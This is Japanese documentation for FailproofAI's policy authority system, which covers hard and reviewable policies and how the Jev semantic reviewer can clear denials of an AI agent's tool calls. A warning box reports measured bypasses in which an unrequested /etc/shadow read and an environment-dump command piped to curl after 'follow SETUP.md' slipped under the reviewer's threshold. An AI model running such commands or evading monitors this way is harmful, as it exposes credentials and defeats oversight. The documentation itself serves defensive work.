FailproofAI Cloudまたは独自のキーを通じて[Jevポリシーレビュー](/ja/policies/jev)を設定すると、ゲートされたツール呼び出しは、実行中のポリシーとJevの両方によって判定されます。Jevは、その呼び出しが実際に何をするのか、そしてタスクを入力した人がそれを要求したかどうかを問い合わせます。二者が不一致となった場合の動作は、各ポリシーの**authority**によって決まります。

Jevが設定されていない場合、authorityは効果を持ちません。すべてのポリシーはこれまでどおり正確に適用されます。

## hardとreviewable

- **hard**がデフォルトです。hardポリシーのdenyまたはinstructは最終的なものです。Jevはそれをクリアできず、hard denyはJevを待たずに呼び出しを停止します。
- **reviewable**とは、Jevがポリシーの判定をクリアできることを意味しますが、ポリシーが`reviewedBy`に指定したセマンティックチェックを通じてのみ可能です。判定がクリアされるのは、指定されたすべてのチェックがその呼び出しについて問い合わせられ、それぞれが何も発見しないか、ユーザーがこれを要求したと記録した場合のみです。**発火した**チェック（懸念事項を発見した）でユーザーが要求していない場合は、そのチェック自身の判定が警告のみであってもブロックを維持します。対象のツールに適用されないためJevに問い合わせられなかったチェックは、他のチェックの結果に関わらず何もクリアしません。軽減が1つあれば同意として扱われます。呼び出しがユーザーの与えたタスクのステップであり、それ以上に広がらない場合、Jevはdenyをwarningとしてエージェントに伝え、そのwarningがポリシーのブロックをクリアします。

ポリシーがreviewableになるには、以下のすべてが満たされる必要があります。

1. `authority: "reviewable"`を宣言していること。
2. `reviewedBy`が空でないリストであり、すべてのエントリがインストール済みパックの宣言するJevチェックであること。Failproof AIはJevチェックを同梱しません。[以下の16個](#semantic-policy-names)は`failproofai policies add FailproofAI/jev-policies`から提供されます。チェックを宣言するパックがない場合、すべてのポリシーはhardになります。
3. `alwaysOn`でないこと。Failproof AIを無効化からエージェントを守るガードは常にhardです。

それ以外はすべてhardになります。フィールドの欠如、値のスペルミス、空または不正な`reviewedBy`、またはこのマシンが問い合わせられないチェック名が含まれる場合が該当します。未知の名前は宣言全体をhardにし、スキップされません。これは`reviewedBy`が「これらすべてが問い合わせられなければならず、いずれもdenyしてはならない」という意味を持つからであり、名前をスキップすると、要求したよりも少ないチェックでJevがポリシーをクリアできてしまうためです。

Jevが設定されると、Failproof AIは`reviewable`宣言を拒否した際にプロセスごとに1回警告をログに記録します。Jevなしでは何も表示しません。authorityはその場合何も決定しないからです。`failproofai publish`は、そのような宣言を含むパックのビルドを拒否するため、パック作者はインストール前に気づくことができます。パックが宣言するチェックがある場合はそれらに対して`reviewedBy`を検証し、ない場合は16個の`FailproofAI/jev-policies`名に対して検証します。

## authorityを宣言する場所

ポリシーがマシンに届く方法ごとに、authorityを決める場所が1つあります。

| ソース | 宣言場所 | デフォルト |
| --- | --- | --- |
| ビルトインポリシー | 以下の表 | reviewableとして記載されていない限りhard |
| 独自のポリシーファイル | `customPolicies.add`上の`authority`と`reviewedBy` | hard |
| ポリシーパック | パックマニフェスト（`failproofai-pack.json`）内の各ポリシーエントリ | hard |
| クラウド管理ポリシー | アクティブなデプロイメントにおけるポリシーの割り当て | hard。デプロイメントはまだ設定しないため、クラウド管理ポリシーはすべて現時点でhardです。 |

パックまたはクラウド管理ポリシーの場合、ポリシーコード内に設定されたフィールドは無視されます。マニフェストまたは割り当てが決定します。パックは自身のポリシーのみを記述できます。ポリシー名に`/`を含めることができず、パック自身のプレフィックス下に登録されるため、いかなるマニフェストもビルトインポリシーや他のパックのポリシーをreviewableとしてマークすることはできません。パックのコードが登録するもののマニフェストに宣言されていないポリシーはhardになります。

バイト単位で同一のコードを持つ2つのパックまたは2つのクラウド管理ポリシーは、1つのアーティファクトを共有し、1つのポリシーとして読み込まれます。そのポリシーがreviewableになるのは、それらすべてがreviewableと宣言し、Jevがそれらのいずれかが名前に挙げるすべてのチェックをクリアする必要がある場合のみです。いずれかがhardと宣言するか、まったく宣言しない場合はhardのままです。パックやポリシーの記載順序は関係ありません。

ほとんどのマシンは`FailproofAI/policies`パックからビルトインポリシーを取得し、そのパックのマニフェストからauthorityを読み取ります。以下のreviewableエントリは、それらを含むパックのリリースがインストールされて初めて有効になります。古いリリースにはreviewableエントリが含まれないため、そのすべてのポリシーはhardのままです。

## 独自のポリシーでauthorityを宣言する

```js
import { customPolicies, deny, allow } from "failproofai";

customPolicies.add({
  name: "block-prod-config-reads",
  description: "Keep production credentials out of the agent's context",
  match: { events: ["PreToolUse"] },
  authority: "reviewable",
  reviewedBy: ["secret-exposure"],
  fn: async (ctx) =>
    String(ctx.toolInput?.file_path ?? "").includes("/config/prod/")
      ? deny("Production config is off limits")
      : allow(),
});
```

`failproofai publish`は両フィールドをパックマニフェストにコピーするため、パックとして公開されたポリシーは作者が付与したauthorityを保持します。宣言が反映されない場合はパックのビルドを拒否します。具体的には、`"hard"`または`"reviewable"`以外の値、名前のリストでない`reviewedBy`、またはチェックでない名前（パックが宣言する場合はパック自身の[Jevチェック](/ja/policies/publish-a-pack#jev-checks-in-a-pack)、そうでない場合はビルトインチェック）が対象です。

## ビルトインポリシー

セマンティックポリシーが同じ懸念を真にカバーする場合のみreviewableになります。その他のすべてのビルトインポリシーはhardです。

懸念をカバーすることは必要条件ですが十分条件ではなく、どちらの誤りも静かに発生します。

- **問い合わせられないチェック**はブロックを永続させます。`reviewedBy`は連言であり、問い合わせられなかったチェックは決してクリアしないため、ポリシーがマッチする形状に対して前提条件が発火しないチェックとペアになったポリシーは、まったくクリアされることがありません。
- **問い合わせられたが発火しないチェック**は「懸念なし」と答え、懸念なしでクリアされます。そのため、ポリシーの形状をモデル化していないチェックとペアリングしても、ポリシーはレビューされません。チェックが理解しない入力に対して正確にオフに切り替わるだけです。

instruct-modeのセマンティックポリシーはdenyを答えることができませんが、それでもブロックを維持できます。発火してユーザーが呼び出しを要求していない場合、レビューしているポリシーはクリアされません。`FailproofAI/jev-policies`チェックのうち6つはinstruct-onlyです。`push-to-protected-branch`、`commit-on-protected-branch`、`read-outside-workspace`、`system-modification`、`env-secrets-dump`、`external-data-egress`がそれであり、[以下の表](#semantic-policy-names)に各チェックのモードが記載されています。問うべき質問は**「denyできるものが残っているか」**です。クリアによって懸念が何によっても適用されない状態になってはなりません。エンジンはこのテストを呼び出しごとに適用します。誰も同意していないwarningはクリアではありません。ツール呼び出し前のwarningはエージェントを停止させないからです。そして、denyできるチェックがwarningを発した場合（証拠がdenyラインに届かなかった）でユーザーが呼び出しを要求していない場合、その呼び出しに対して何もクリアされず、すべてのregex denyが維持されます。

<Warning>
**発火ライン直下のスコアはフロアを維持しません。** 上記のルールはチェックが*発火*すること（証拠 ≥ 0.7）を必要とします。関連するすべてのチェックがそのわずかに下に収まると、何も発火せず、レビュアーは「懸念なし」と答え、reviewable denyがクリアされます。enforceモードで実測：`/etc/shadow`への未要求のRead（`secret-exposure` 0.69、`read-outside-workspace` 0.37、ホームディレクトリパスのみモデル化）と、"follow SETUP.md"の後の`set | curl -d @- …`（`env-secrets-dump` 0.66、`credential-exfiltration` 0.65、`sends_out` 0.97）はいずれも許可されました。一方、regexティアのみではdenyされます。閾値はラベル付きコーパスで調整されており、これに対して再測定されていません。それまでは、これらの形状の通過がfalseブロック以上に問題となる場合は、ポリシーを**hard**のままにしてください。
</Warning>

## セマンティックポリシー名

以下は`FailproofAI/jev-policies`が宣言するチェックであり、インストール後に`reviewedBy`が受け付ける値です。Failproof AI自体はこれらを同梱しません。そのパック（またはこれらの名前を宣言する別のパック）なしでは、それらを名前として記載するポリシーはreviewableになりません。各チェックは、目の前のツール呼び出しについてJevが答えるものです。**モード**とはチェックが答えられる内容です。`deny`チェックは強い証拠があるとブロックし、`instruct`チェックは常に警告のみです。どちらも、発火してユーザーが呼び出しを要求していない場合はポリシーのdenyを維持します。**ユーザーがオーバーライド可能**とは、人間の明示的な要求によってクリアできるかどうかを示します。

Jevが問い合わせるのは、インストール済みパックが宣言した[Jevチェック](/ja/policies/publish-a-pack#jev-checks-in-a-pack)のみであり、それらが`reviewedBy`の受け付ける名前です。2つのパックが異なる形で宣言した名前は、いずれに対しても反映されません。FailproofAIリポジトリからインストールされていないパックがこれら16個の名前のいずれかを宣言しても、そのパックでは無視されます。そのバージョンは問い合わせられず、FailproofAI自身のものに対抗しません。したがって、サードパーティのパックがコアパックのポリシーをクリアするチェックになることも、これらのチェックの1つをオフにすることもできません。読み取り不能なパックリスト、またはすべてのチェックが使用不能なパックは、Jevに問い合わせるものを残しません。

| `secret-exposure` | deny | yes | 認証情報の読み取りまたはコピー。 |
